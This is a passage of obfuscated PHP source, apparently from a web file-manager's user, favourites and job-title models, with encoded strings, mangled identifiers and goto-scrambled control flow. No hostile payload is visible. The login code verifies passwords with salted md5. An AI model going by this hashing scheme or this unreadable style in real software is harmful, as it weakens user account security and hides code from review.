"\173\151\x6f\x3a{$AççÓÔáäµ[$F¬â™≥ÍÛ[691]]}\175\x2f\x64\x61\164\141\142\141\163\x65\57"; IO::mkdir($B™˜êôÇÇÍ . "\x62\x61\143\153\165\x70\x5f{$A÷…áÊæò«}\57"); goto b¡’à∂ÕÌÙ; Fùπ∂‰©Ôä: $F¬â™≥ÍÛ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $AççÓÔáäµ = Backup::get(); $A÷…áÊæò« = $AççÓÔáäµ[$F¬â™≥ÍÛ[28]]; goto eÔ™íâ≤·ç; cò∑§°Ü°Ö: } } goto a∫äåßë¬Ç; dﬁ‘“Ëÿà˜: class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\137\146\x61\x76"; protected function cacheFunctionAlias($Dî±õ™ßı®) { $Dª™Ù¬◊ËØ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; return array($Dª™Ù¬◊ËØ[2489] => array(USER_ID, $Dª™Ù¬◊ËØ[2490])); } protected function listData() { $B⁄çÁÇáàÆ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $aÑ⁄ìΩîÚí = array($B⁄çÁÇáàÆ[1429] => USER_ID, $B⁄çÁÇáàÆ[436] => 0); $B’ê‡‘Í°ú = $B⁄çÁÇáàÆ[2491]; $E±Êã·‰·• = $this->field($B’ê‡‘Í°ú)->where($aÑ⁄ìΩîÚí)->order($B⁄çÁÇáàÆ[2492])->select(); return $E±Êã·‰·• ? $E±Êã·‰·• : array(); } protected function resetCache() { } protected function listView() { goto E◊öﬂÀÈõò; Dê∏œ∑‚Ç≠: $D¿“üñ◊÷ = array_to_keyvalue($c∫Ü‰ú€Ûò, $fßæ„ÇÑıÈ[33], $fßæ„ÇÑıÈ[75]); if (!$D¿“üñ◊÷) { return $búâ≈ÛÎÜç; } $Aõ¶⁄ÇûÚﬂ = 2000; goto Eè∫ØÜ´Õ; Eè∫ØÜ´Õ: $fë‚¡ê¶ç = array($fßæ„ÇÑıÈ[383] => array($fßæ„ÇÑıÈ[384], $D¿“üñ◊÷)); $dì∆÷∞ä÷ú = Model($fßæ„ÇÑıÈ[761])->listSource($fë‚¡ê¶ç, $Aõ¶⁄ÇûÚﬂ); $dì∆÷∞ä÷ú = array_merge($dì∆÷∞ä÷ú[$fßæ„ÇÑıÈ[73]], $dì∆÷∞ä÷ú[$fßæ„ÇÑıÈ[74]]); goto C™òÿÀâ¥ä; C™òÿÀâ¥ä: $dì∆÷∞ä÷ú = array_to_keyvalue($dì∆÷∞ä÷ú, $fßæ„ÇÑıÈ[369]); foreach ($búâ≈ÛÎÜç as $a…øñ⁄‡í => $Dêﬂë¬¥äà) { $AôˆıêÀÿã = $dì∆÷∞ä÷ú[$Dêﬂë¬¥äà[$fßæ„ÇÑıÈ[75]]]; $AôˆıêÀÿã = $AôˆıêÀÿã ? $AôˆıêÀÿã : array(); $búâ≈ÛÎÜç[$a…øñ⁄‡í] = array_merge($AôˆıêÀÿã, $Dêﬂë¬¥äà); } return $búâ≈ÛÎÜç; goto FœÖ…˘ãËÃ; E◊öﬂÀÈõò: $fßæ„ÇÑıÈ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $búâ≈ÛÎÜç = $this->listData(); $c∫Ü‰ú€Ûò = array_filter_by_field($búâ≈ÛÎÜç, $fßæ„ÇÑıÈ[29], $fßæ„ÇÑıÈ[382]); goto Dê∏œ∑‚Ç≠; FœÖ…˘ãËÃ: } protected function addFav($f∆ÁÓø»„ë, $C“âÃ≤’Ë› = '', $A·œç€¯á¡ = "\163\157\165\162\143\145") { goto cÎËµÑ≤ú”; cÎËµÑ≤ú”: $EÙµ¨›œäø =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $E≤ìïô»´† = array($EÙµ¨›œäø[1429] => USER_ID, $EÙµ¨›œäø[436] => 0, $EÙµ¨›œäø[388] => $A·œç€¯á¡, $EÙµ¨›œäø[387] => $f∆ÁÓø»„ë); if ($this->where($E≤ìïô»´†)->find()) { return !1; } goto DµîÃçèÒ·; FÀ€˜ÛÒÌ: return $this->add($Añ˜≈¯√Ã’); goto BèñÂ“ô ◊; DµîÃçèÒ·: $E≤ìïô»´† = array($EÙµ¨›œäø[1429] => USER_ID, $EÙµ¨›œäø[436] => 0); $c∏∆ÁàÉ«Ì = $this->where($E≤ìïô»´†)->max($EÙµ¨›œäø[2127]); if (!$c∏∆ÁàÉ«Ì) { $c∏∆ÁàÉ«Ì = 0; } goto d¶∑ˆ†÷ÊÚ; d¶∑ˆ†÷ÊÚ: if (!$C“âÃ≤’Ë› && $A·œç€¯á¡ == $EÙµ¨›œäø[382]) { $CóñÛ¯∑ØŸ = Model($EÙµ¨›œäø[1121])->where(array($EÙµ¨›œäø[383] => $f∆ÁÓø»„ë))->find(); if (!$CóñÛ¯∑ØŸ) { return !1; } $C“âÃ≤’Ë› = $CóñÛ¯∑ØŸ[$EÙµ¨›œäø[28]]; } $C“âÃ≤’Ë› = $this->getAutoName($C“âÃ≤’Ë›); $Añ˜≈¯√Ã’ = array($EÙµ¨›œäø[1429] => USER_ID, $EÙµ¨›œäø[436] => 0, $EÙµ¨›œäø[386] => $C“âÃ≤’Ë›, $EÙµ¨›œäø[387] => $f∆ÁÓø»„ë, $EÙµ¨›œäø[388] => $A·œç€¯á¡, $EÙµ¨›œäø[2110] => $c∏∆ÁàÉ«Ì + 1); goto FÀ€˜ÛÒÌ; BèñÂ“ô ◊: } protected function remove($B•¿†íñè‡) { $Cú†ç±§ÿã =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $B¥¬úﬁ√äÜ = array($Cú†ç±§ÿã[1429] => USER_ID, $Cú†ç±§ÿã[385] => $B•¿†íñè‡); return $this->where($B¥¬úﬁ√äÜ)->delete(); } protected function removeByName($CΩë◊‡≥ˆõ) { $AÆíÒˆ √Ü =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $D—≠¥ÇÍÒè = array($AÆíÒˆ √Ü[1429] => USER_ID, $AÆíÒˆ √Ü[386] => $CΩë◊‡≥ˆõ, $AÆíÒˆ √Ü[436] => 0); return $this->where($D—≠¥ÇÍÒè)->delete(); } protected function rename($cΩ©≥¯∑äÉ, $DÑÉèΩ∏¨Œ) { $a¥î¢ÃéÈí =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($cΩ©≥¯∑äÉ == $DÑÉèΩ∏¨Œ) { return !1; } $aéã›áË“Û = $this->getAutoName($DÑÉèΩ∏¨Œ); if ($DÑÉèΩ∏¨Œ != $aéã›áË“Û) { return !1; } $a›±ºÉæ ‰ = array($a¥î¢ÃéÈí[1429] => USER_ID, $a¥î¢ÃéÈí[436] => 0, $a¥î¢ÃéÈí[28] => $cΩ©≥¯∑äÉ); return $this->where($a›±ºÉæ ‰)->save(array($a¥î¢ÃéÈí[28] => $DÑÉèΩ∏¨Œ)); } protected function resetSort($dœ∂èÈ™ãÌ) { $FêÉ¢ªãÕâ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dœ∂èÈ™ãÌ = is_array($dœ∂èÈ™ãÌ) ? $dœ∂èÈ™ãÌ : array(); $c⁄Ê§≈çéπ = array($FêÉ¢ªãÕâ[1429] => USER_ID); for ($DçùóÑ°ãÙ = 0; $DçùóÑ°ãÙ < count($dœ∂èÈ™ãÌ); $DçùóÑ°ãÙ++) { $c⁄Ê§≈çéπ[$FêÉ¢ªãÕâ[385]] = $dœ∂èÈ™ãÌ[$DçùóÑ°ãÙ]; $this->where($c⁄Ê§≈çéπ)->save(array($FêÉ¢ªãÕâ[2110] => $DçùóÑ°ãÙ + 1)); } return !0; } protected function moveTop($E´≠ìåï∆ñ) { goto aÜÂ›†¿ç∂; C≈‚ã ∂‰ä: if (!$Bƒÿ∫ç˜±) { return; } $cﬁèπ∆¡Ωò = $this->field($dúåªåı≠Ÿ[367])->where($f—≠„£ßŒ«)->order($dúåªåı≠Ÿ[2492])->select(); $cﬁèπ∆¡Ωò = array_to_keyvalue($cﬁèπ∆¡Ωò, $dúåªåı≠Ÿ[33], $dúåªåı≠Ÿ[367]); goto eŒÏîã∆≥ô; c∆Ù≈—øçµ: return $this->resetSort($cﬁèπ∆¡Ωò); goto e†À¯“Î¿º; eŒÏîã∆≥ô: $B ”¢ó¡´≈ = $cﬁèπ∆¡Ωò; $cﬁèπ∆¡Ωò = array_remove_value($cﬁèπ∆¡Ωò, $Bƒÿ∫ç˜±[$dúåªåı≠Ÿ[367]]); array_unshift($cﬁèπ∆¡Ωò, $Bƒÿ∫ç˜±[$dúåªåı≠Ÿ[367]]); goto c∆Ù≈—øçµ; aÜÂ›†¿ç∂: $dúåªåı≠Ÿ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $f—≠„£ßŒ« = array($dúåªåı≠Ÿ[1429] => USER_ID, $dúåªåı≠Ÿ[436] => 0); $Bƒÿ∫ç˜± = $this->where($f—≠„£ßŒ«)->where(array($dúåªåı≠Ÿ[28] => $E´≠ìåï∆ñ))->find(); goto C≈‚ã ∂‰ä; e†À¯“Î¿º: } protected function moveBottom($CŸúëÛÍëË) { $d±íæﬁò≥¨ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bŒ»…⁄≈ﬂ± = array($d±íæﬁò≥¨[1429] => USER_ID, $d±íæﬁò≥¨[436] => 0); $C‚ñõÎÚœÉ = $this->where($bŒ»…⁄≈ﬂ±)->max($d±íæﬁò≥¨[2127]); $c˜ÿë¬ÔôÇ = array($d±íæﬁò≥¨[2127] => $C‚ñõÎÚœÉ + 1); return $this->where($bŒ»…⁄≈ﬂ±)->where(array($d±íæﬁò≥¨[28] => $CŸúëÛÍëË))->save($c˜ÿë¬ÔôÇ); } private function getAutoName($FºêºÕ““¥) { goto a“ªØèÊ•ù; a“ªØèÊ•ù: $B÷àÛÁ÷˘≥ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $A∞≥íóÉ“â = array($B÷àÛÁ÷˘≥[1429] => USER_ID, $B÷àÛÁ÷˘≥[436] => 0); $Aó¯ÕËﬁ†∑ = $this->field($B÷àÛÁ÷˘≥[28])->where($A∞≥íóÉ“â)->select(); goto E∞èÓíâÖÆ; E∞èÓíâÖÆ: $Aó¯ÕËﬁ†∑ = array_to_keyvalue($Aó¯ÕËﬁ†∑, $B÷àÛÁ÷˘≥[33], $B÷àÛÁ÷˘≥[28]); if (!$Aó¯ÕËﬁ†∑ || !in_array($FºêºÕ““¥, $Aó¯ÕËﬁ†∑)) { return $FºêºÕ““¥; } for ($aÏÉúÒÎÏ” = 0; $aÏÉúÒÎÏ” < count($Aó¯ÕËﬁ†∑); $aÏÉúÒÎÏ”++) { if (!in_array($FºêºÕ““¥ . "\x28{$aÏÉúÒÎÏ”}\x29", $Aó¯ÕËﬁ†∑)) { return $FºêºÕ““¥ . "\50{$aÏÉúÒÎÏ”}\51"; } } goto Cõ‹ë–†ﬂŒ; Cõ‹ë–†ﬂŒ: return $FºêºÕ““¥ . "\50{$aÏÉúÒÎÏ”}\x29"; goto báá‡Œê‚’; báá‡Œê‚’: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\x6d\56\152\157\x62\x4c\151\x73\x74"; public $field = array("\156\141\x6d\x65", "\144\x65\x73\x63", "\163\157\162\x74"); const JOB_KEY = "\163\x65\x6c\146\x4a\157\142\114\x69\163\x74"; public function listData($B∑Éà·”ø— = false, $b¶∑ˆÛ‰Îé = "\x73\157\x72\x74", $fÛù¯—™·— = false) { return parent::listData($B∑Éà·”ø—, $b¶∑ˆÛ‰Îé, $fÛù¯—™·—); } public function remove($a©ŸÓÜìâû) { return parent::remove($a©ŸÓÜìâû); } public function add($Bßê˘Ú‹ä˜) { $fÒè•¥Â˜Ø =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($this->findByName($Bßê˘Ú‹ä˜[$fÒè•¥Â˜Ø[28]])) { return !1; } $Bßê˘Ú‹ä˜[$fÒè•¥Â˜Ø[2127]] = $this->getSort(); return parent::insert($Bßê˘Ú‹ä˜); } private function getSort() { $CêÓÂ˜é»» =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $C◊ÚÃË–ƒÀ = parent::listData(); $AÛ∂îÚ∏ˆı = array_to_keyvalue($C◊ÚÃË–ƒÀ, $CêÓÂ˜é»»[33], $CêÓÂ˜é»»[2127]); return empty($AÛ∂îÚ∏ˆı) ? 0 : max($AÛ∂îÚ∏ˆı) + 1; } public function update($A™òˆÍÁ¿Ç, $A¨≠Ò≤ò Ô) { $a´›Ã¬ﬂ›Í =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $e¡ﬂﬂÕŸ’ö = parent::listData($A™òˆÍÁ¿Ç); $BÏñ∫™≠Ÿ– = $this->findByName($A¨≠Ò≤ò Ô[$a´›Ã¬ﬂ›Í[28]]); if (!$e¡ﬂﬂÕŸ’ö || $BÏñ∫™≠Ÿ– && $BÏñ∫™≠Ÿ–[$a´›Ã¬ﬂ›Í[367]] != $e¡ﬂﬂÕŸ’ö[$a´›Ã¬ﬂ›Í[367]]) { return !1; } return parent::update($A™òˆÍÁ¿Ç, $A¨≠Ò≤ò Ô); } public function setUserJob($b¶è€“Û∆≥, $aÂüßûçÁë) { goto fçˆñ¨Î∞∑; A†€∆»§∫≠: $C¨≥äµÇÓ˜ = rtrim($C¨≥äµÇÓ˜, $dË√Ÿ‹Ñ”Ã[47]); Model($dË√Ÿ‹Ñ”Ã[477])->metaSet($b¶è€“Û∆≥, self::JOB_KEY, $C¨≥äµÇÓ˜); goto e⁄éﬁÓ£ﬁ≠; fçˆñ¨Î∞∑: $dË√Ÿ‹Ñ”Ã =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!is_array($aÂüßûçÁë)) { $aÂüßûçÁë = array($aÂüßûçÁë); } $fÛœÛÖ∞˘ = parent::listData(); goto cÃÆ‡≠ öÆ; cÃÆ‡≠ öÆ: $DÇ∆Úîø≈∫ = array_to_keyvalue($fÛœÛÖ∞˘, $dË√Ÿ‹Ñ”Ã[28]); $C¨≥äµÇÓ˜ = $dË√Ÿ‹Ñ”Ã[361]; foreach ($aÂüßûçÁë as $b•Ü √Ü‡≥) { if ($DÇ∆Úîø≈∫[$b•Ü √Ü‡≥]) { $C¨≥äµÇÓ˜ .= $DÇ∆Úîø≈∫[$b•Ü √Ü‡≥][$dË√Ÿ‹Ñ”Ã[367]] . $dË√Ÿ‹Ñ”Ã[47]; } else { $d«ÍŸ«Ö◊ = $this->add($b•Ü √Ü‡≥); $C¨≥äµÇÓ˜ .= $d«ÍŸ«Ö◊ . $dË√Ÿ‹Ñ”Ã[47]; } } goto A†€∆»§∫≠; e⁄éﬁÓ£ﬁ≠: } public function getUserJob($Dÿ…ÀÆøòô) { $c’óØ•¢¶Ú = Model($_SERVER[Ä¿¡‡öóµŸﬂ‡][477])->metaGet($Dÿ…ÀÆøòô); return $this->getUserJobInfo($c’óØ•¢¶Ú[self::JOB_KEY]); } public function getUserJobInfo($aóÖ´“ûçå) { goto a¿∞ÁÔùÛè; A‰–•√»å·: $Dﬁá‘∑ïÜ€ = array_remove_key($Dﬁá‘∑ïÜ€, $D Ë¯ÍÆ¿Í[187]); $f√ÎºÈÙÛÏ = array(); foreach ($cïπ‘Óè⁄ç as $d‘âåÏ•ªè) { if (isset($Dﬁá‘∑ïÜ€[$d‘âåÏ•ªè])) { $f√ÎºÈÙÛÏ[] = $Dﬁá‘∑ïÜ€[$d‘âåÏ•ªè]; } } goto C¯ÑÛÚáõ‚; a¿∞ÁÔùÛè: $D Ë¯ÍÆ¿Í =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cïπ‘Óè⁄ç = explode($D Ë¯ÍÆ¿Í[47], $aóÖ´“ûçå); $Dﬁá‘∑ïÜ€ = parent::listData(); goto A‰–•√»å·; C¯ÑÛÚáõ‚: return $f√ÎºÈÙÛÏ; goto C–ôòΩæö¯; C–ôòΩæö¯: } } class UserModel extends ModelBase { protected $tableName = "\165\163\145\x72"; protected $tableMeta = array("\164\141\142\154\145\116\141\x6d\145" => "\165\x73\145\162\137\155\x65\164\141", "\155\x65\x74\141\106\x69\145\x6c\144" => "\x75\163\x65\x72\x49\x44"); protected $simpleField = "\x75\x73\x65\162\111\104\54\156\151\x63\x6b\116\141\155\x65\54\x6e\x61\x6d\145\x2c\x61\166\x61\164\141\162\x2c\x73\145\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($FëÀ÷ÂË‡¥) { $d‘•∞î¨Œí =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $a¶±àÀàâè = $d‘•∞î¨Œí[2493]; return array($d‘•∞î¨Œí[2173] => array($FëÀ÷ÂË‡¥[0], $a¶±àÀàâè), $d‘•∞î¨Œí[2175] => array($FëÀ÷ÂË‡¥[0], $a¶±àÀàâè), $d‘•∞î¨Œí[2494] => array($FëÀ÷ÂË‡¥[0], $a¶±àÀàâè)); } protected function getInfo($bõïáÒñ∂¥, $E∆˘ÁØºŸ§ = false) { $cìΩ≈—ÖßÕ = $this->getInfoSimple($bõïáÒñ∂¥); if (!is_array($cìΩ≈—ÖßÕ)) { return array(); } if ($E∆˘ÁØºŸ§) { return $this->_getInfoApply($cìΩ≈—ÖßÕ); } return $this->cacheFunctionGet($_SERVER[Ä¿¡‡öóµŸﬂ‡][2215], $bõïáÒñ∂¥); } protected function getInfoFull($Béøú≈üàÈ, $bãè¬…”û¶ = false) { $BÛÀÈç˜ê® = $this->getInfoSimple($Béøú≈üàÈ); if (!is_array($BÛÀÈç˜ê®)) { return array(); } if ($bãè¬…”û¶) { return $this->_getInfoApply($BÛÀÈç˜ê®, !0); return $this->_getInfoApply($BÛÀÈç˜ê®, !0); } return $this->cacheFunctionGet($_SERVER[Ä¿¡‡öóµŸﬂ‡][2495], $Béøú≈üàÈ); } private function _getInfoApply($B±√È•ëÈ∑, $F´É Ì Ñï = false) { goto Eçé¨›€∞¢; Eçé¨›€∞¢: $døÖòÑ¢Ñ∫ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$B±√È•ëÈ∑) { return $B±√È•ëÈ∑; } $aÎ§ÿÔåØ“ = md5($døÖòÑ¢Ñ∫[2496] . $B±√È•ëÈ∑[$døÖòÑ¢Ñ∫[806]] . $døÖòÑ¢Ñ∫[2497] . $B±√È•ëÈ∑[$døÖòÑ¢Ñ∫[28]]); goto D´—πÂäÉ◊; cÎÁà§é¯: $B±√È•ëÈ∑[$døÖòÑ¢Ñ∫[391]][$døÖòÑ¢Ñ∫[2332]] = isset($C€è‰ïÍæ∫[$døÖòÑ¢Ñ∫[2333]]) ? $C€è‰ïÍæ∫[$døÖòÑ¢Ñ∫[2333]] : null; if ($F´É Ì Ñï) { $B±√È•ëÈ∑[$døÖòÑ¢Ñ∫[417]] = $this->metaGet($B±√È•ëÈ∑[$døÖòÑ¢Ñ∫[1438]]); } return $B±√È•ëÈ∑; goto fì”«›◊…ç; D´—πÂäÉ◊: $B±√È•ëÈ∑ = $this->_listDataApplyItem($B±√È•ëÈ∑); $C€è‰ïÍæ∫ = Model($døÖòÑ¢Ñ∫[1121])->metaGet($B±√È•ëÈ∑[$døÖòÑ¢Ñ∫[391]][$døÖòÑ¢Ñ∫[369]]); $B±√È•ëÈ∑[$døÖòÑ¢Ñ∫[2498]] = $aÎ§ÿÔåØ“; goto cÎÁà§é¯; fì”«›◊…ç: } protected function getInfoSimple($FéÀ∫«ˆâı, $d∆äèû®‡ñ = false) { $c–ªÊíﬂ®§ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$FéÀ∫«ˆâı) { return array(); } if ($d∆äèû®‡ñ) { $DÑ÷∂›È∞î = $this->where(array($c–ªÊíﬂ®§[1438] => intval($FéÀ∫«ˆâı)))->find(); if (!is_array($DÑ÷∂›È∞î)) { return array(); } $DÑ÷∂›È∞î[$c–ªÊíﬂ®§[2499]] = Action($c–ªÊíﬂ®§[2500])->parseUrl($DÑ÷∂›È∞î[$c–ªÊíﬂ®§[2499]]); return $DÑ÷∂›È∞î; } return $this->cacheFunctionGet($c–ªÊíﬂ®§[2176], $FéÀ∫«ˆâı); } protected function getInfoSimpleOuter($eçæŒà‹¨µ) { goto A¿ã¶óäÒã; d≈Ããñ¥Œµ: $dãÂ•ŸÜµÓ = array_field_key($Dñ∂ƒ‡”√», explode($BµæúÕ¨êÇ[47], $this->simpleField)); if (!$dãÂ•ŸÜµÓ) { return array($BµæúÕ¨êÇ[1438] => $BµæúÕ¨êÇ[1035], $BµæúÕ¨êÇ[28] => $BµæúÕ¨êÇ[157] . LNG($BµæúÕ¨êÇ[2503]) . $BµæúÕ¨êÇ[476], $BµæúÕ¨êÇ[2499] => STATIC_PATH . $BµæúÕ¨êÇ[2504]); } $dãÂ•ŸÜµÓ[$BµæúÕ¨êÇ[2499]] = Action($BµæúÕ¨êÇ[2500])->parseUrl($dãÂ•ŸÜµÓ[$BµæúÕ¨êÇ[2499]]); goto eŒƒÙéÚå¯; eŒƒÙéÚå¯: return $dãÂ•ŸÜµÓ; goto CÍÀ≥¶åƒ€; A¿ã¶óäÒã: $BµæúÕ¨êÇ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$eçæŒà‹¨µ || $eçæŒà‹¨µ == 0) { return array($BµæúÕ¨êÇ[1438] => $BµæúÕ¨êÇ[468], $BµæúÕ¨êÇ[28] => $BµæúÕ¨êÇ[157] . LNG($BµæúÕ¨êÇ[2501]) . $BµæúÕ¨êÇ[476], $BµæúÕ¨êÇ[2499] => STATIC_PATH . $BµæúÕ¨êÇ[2502]); } $Dñ∂ƒ‡”√» = $this->cacheFunctionGet($BµæúÕ¨êÇ[2176], $eçæŒà‹¨µ); goto d≈Ããñ¥Œµ; CÍÀ≥¶åƒ€: } protected function groupUser($DúÈÁà√ ™) { } public static function errorLang($cÂÈé√˜˜°) { $F¥ÁÈïçã¿ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $añ¡√µâπ = array(self::ERROR_USER_NOT_EXISTS => $F¥ÁÈïçã¿[2505], self::ERROR_USER_PASSWORD_ERROR => $F¥ÁÈïçã¿[2506], self::ERROR_USER_EXIST_NAME => $F¥ÁÈïçã¿[2507], self::ERROR_USER_EXIST_PHONE => $F¥ÁÈïçã¿[2508], self::ERROR_USER_EXIST_EMAIL => $F¥ÁÈïçã¿[2509], self::ERROR_USER_LOGIN_LOCK => $F¥ÁÈïçã¿[2510], self::ERROR_IP_NOT_ALLOW => $F¥ÁÈïçã¿[2511], self::ERROR_USER_EXIST_NICKNAME => $F¥ÁÈïçã¿[2512]); return LNG($añ¡√µâπ[$cÂÈé√˜˜°]); } public function getInfoByMeta($C©œÙàÛßµ, $DÚÉÉıÀ—Ú) { $aËÈﬂ∆˜ëä =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eﬁ¡¥Üá©Ê = Model($aËÈﬂ∆˜ëä[2513])->where(array($aËÈﬂ∆˜ëä[89] => $C©œÙàÛßµ, $aËÈﬂ∆˜ëä[359] => $DÚÉÉıÀ—Ú))->find(); if ($eﬁ¡¥Üá©Ê) { return $this->getInfo($eﬁ¡¥Üá©Ê[$aËÈﬂ∆˜ëä[1438]]); } return !1; } public function userLoginCheck($d≤ÑŒÊÖÖà, $B©ƒÌ¬»…ï) { goto fÏ∞ßµ”≥∏; fÏ∞ßµ”≥∏: $AôÖäÑΩù∫ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $C”⁄—ß∂√é = array($AôÖäÑΩù∫[28] => $d≤ÑŒÊÖÖà, $AôÖäÑΩù∫[2336] => $d≤ÑŒÊÖÖà, $AôÖäÑΩù∫[293] => $d≤ÑŒÊÖÖà, $AôÖäÑΩù∫[2514] => $d≤ÑŒÊÖÖà, $AôÖäÑΩù∫[918] => $AôÖäÑΩù∫[920]); if ($this->nickNameRpt()) { unset($C”⁄—ß∂√é[$AôÖäÑΩù∫[2336]]); } goto CåÓ°¢ÈÁÏ; CåÓ°¢ÈÁÏ: $cÜ»∆ﬂñ◊ı = $this->where($C”⁄—ß∂√é)->find(); if (!$cÜ»∆ﬂñ◊ı) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($cÜ»∆ﬂñ◊ı[$AôÖäÑΩù∫[1438]], $B©ƒÌ¬»…ï)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto eç’ê≤È≥Â; eç’ê≤È≥Â: $this->userEdit($cÜ»∆ﬂñ◊ı[$AôÖäÑΩù∫[1438]], array($AôÖäÑΩù∫[2515] => time())); return $this->getInfo($cÜ»∆ﬂñ◊ı[$AôÖäÑΩù∫[1438]]); goto E¯ÑûµÛÛê; E¯ÑûµÛÛê: } public function clearCache($D‚ØÎ´∑∑ö) { $Fˆ•åáÖÍæ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->cacheFunctionClear($Fˆ•åáÖÍæ[2215], $D‚ØÎ´∑∑ö); $this->cacheFunctionClear($Fˆ•åáÖÍæ[2176], $D‚ØÎ´∑∑ö); $this->cacheFunctionClear($Fˆ•åáÖÍæ[2495], $D‚ØÎ´∑∑ö); } public function userPasswordCheck($e±©ŒŒ∞∂“, $cû◊Ã∏òÑß) { $Bâ£ï•¡ö∞ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $aç°úàãêƒ = $this->where(array($Bâ£ï•¡ö∞[1438] => intval($e±©ŒŒ∞∂“)))->find(); $aÃÏìôªÖ˘ = $this->metaGet($e±©ŒŒ∞∂“); $BâºøòΩÜ¥ = isset($aÃÏìôªÖ˘[$Bâ£ï•¡ö∞[2516]]) ? $aÃÏìôªÖ˘[$Bâ£ï•¡ö∞[2516]] : $Bâ£ï•¡ö∞[33]; if (md5($BâºøòΩÜ¥ . trim($cû◊Ã∏òÑß)) !== $aç°úàãêƒ[$Bâ£ï•¡ö∞[806]]) { return !1; } return !0; } public function userAdd($fæèÑÉΩÓ„) { goto dµÔä‘˘¬Ü; e’®í€’Ö·: $D≥ÚÃ·Æ∫ﬂ = array($cäâäíê·£[2524] => $e÷ıﬂ˘∆åﬁ[$cäâäíê·£[806]], $cäâäíê·£[2520] => $e÷ıﬂ˘∆åﬁ[$cäâäíê·£[2336]]); $this->userEdit($B∆Ñï´ç‚Ö, $D≥ÚÃ·Æ∫ﬂ); Model($cäâäíê·£[1121])->userRootAdd($B∆Ñï´ç‚Ö); goto d·∏ºÂÖ–≥; dµÔä‘˘¬Ü: $cäâäíê·£ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $e÷ıﬂ˘∆åﬁ = array($cäâäíê·£[386] => $fæèÑÉΩÓ„[$cäâäíê·£[28]], $cäâäíê·£[2517] => $fæèÑÉΩÓ„[$cäâäíê·£[1324]], $cäâäíê·£[2518] => isset($fæèÑÉΩÓ„[$cäâäíê·£[293]]) ? $fæèÑÉΩÓ„[$cäâäíê·£[293]] : $cäâäíê·£[33], $cäâäíê·£[2519] => isset($fæèÑÉΩÓ„[$cäâäíê·£[2514]]) ? $fæèÑÉΩÓ„[$cäâäíê·£[2514]] : $cäâäíê·£[33], $cäâäíê·£[2520] => isset($fæèÑÉΩÓ„[$cäâäíê·£[2336]]) ? $fæèÑÉΩÓ„[$cäâäíê·£[2336]] : $fæèÑÉΩÓ„[$cäâäíê·£[28]], $cäâäíê·£[2521] => isset($fæèÑÉΩÓ„[$cäâäíê·£[2499]]) ? $fæèÑÉΩÓ„[$cäâäíê·£[2499]] : $cäâäíê·£[33], $cäâäíê·£[2522] => isset($fæèÑÉΩÓ„[$cäâäíê·£[2523]]) ? $fæèÑÉΩÓ„[$cäâäíê·£[2523]] : 1, $cäâäíê·£[2524] => $fæèÑÉΩÓ„[$cäâäíê·£[806]], $cäâäíê·£[2177] => isset($fæèÑÉΩÓ„[$cäâäíê·£[2090]]) ? $fæèÑÉΩÓ„[$cäâäíê·£[2090]] : 1024 * 1024 * 20, $cäâäíê·£[2178] => 0, $cäâäíê·£[2515] => 0, $cäâäíê·£[2202] => isset($fæèÑÉΩÓ„[$cäâäíê·£[689]]) ? $fæèÑÉΩÓ„[$cäâäíê·£[689]] : 1); if (!empty($fæèÑÉΩÓ„[$cäâäíê·£[1438]])) { $e÷ıﬂ˘∆åﬁ[$cäâäíê·£[1438]] = $fæèÑÉΩÓ„[$cäâäíê·£[1438]]; } goto e¥âÀòµ≥·; d·∏ºÂÖ–≥: return $B∆Ñï´ç‚Ö; goto aâ±ÔÕàôÉ; e¥âÀòµ≥·: $FºΩÜ˘∑©∑ = $this->_checkExist($fæèÑÉΩÓ„); if ($FºΩÜ˘∑©∑ !== !0) { return $FºΩÜ˘∑©∑; } $B∆Ñï´ç‚Ö = $this->add($e÷ıﬂ˘∆åﬁ); goto e’®í€’Ö·; aâ±ÔÕàôÉ: } protected function userEditTest($f√ìﬂﬁΩ¡á, $A«°ØÜõõÏ) { return $this->call($_SERVER[Ä¿¡‡öóµŸﬂ‡][2525], $f√ìﬂﬁΩ¡á, $A«°ØÜõõÏ); } protected function userEdit($DüõÍò˜ˆ˜, $f¨¢“ûöıÑ) { goto CÓ±ªñÓ›ê; CàØ•—∂º≈: return !0; goto CñõÁò√Êì; f´≠ø ≠√Õ: $this->where(array($FÍôßâ»∞Ñ[1429] => $DüõÍò˜ˆ˜))->save($f¨¢“ûöıÑ); if 